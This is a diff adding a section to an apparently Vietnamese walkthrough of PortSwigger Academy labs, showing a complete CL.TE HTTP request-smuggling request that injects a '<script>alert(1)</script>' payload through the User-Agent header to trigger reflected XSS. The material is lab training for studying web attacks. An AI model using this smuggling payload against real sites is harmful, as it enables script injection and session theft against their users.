@@ -370,6 +370,27 @@ Submit request, đợi một thời gian để user gửi request rồi refresh 
 Như vậy, ta lấy được session của user `session=VyERtqn8lwKR4QWQdHAHaRjcSrWmeYhi`. Thay thế với cookie hiện tại rồi refresh, kết quả thành công.
 
 # 10. Exploiting HTTP request smuggling to deliver reflected XSS
+Gửi request `GET /post/post?id=7` với header `User-Agent: damn` thì thấy response có reflect giá trị này: `<input required type="hidden" name="userAgent" value="damn">`. Như vậy để exploit XSS, ta chỉ cần thay đổi header `User-Agent: "><script>alert(1)</script>`
+
+Do website có lỗ hổng CL.TE, ta cấu hình request sau:
+```
+POST / HTTP/1.1
+Host: 0a590080042cebcfc157803700d5002a.web-security-academy.net
+User-Agent: damn
+Content-Length: 213
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=7 HTTP/1.1
+Host: 0a590080042cebcfc157803700d5002a.web-security-academy.net
+User-Agent: "><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
+Sau khi submit request trên, smuggled request sẽ là `GET /post?postId=7` với header User-Agent bị thay đổi để exploit reflected XSS. Kết quả, bài lab được giải thành công.
 
 # 11. Response queue poisoning via H2.TE request smuggling
 
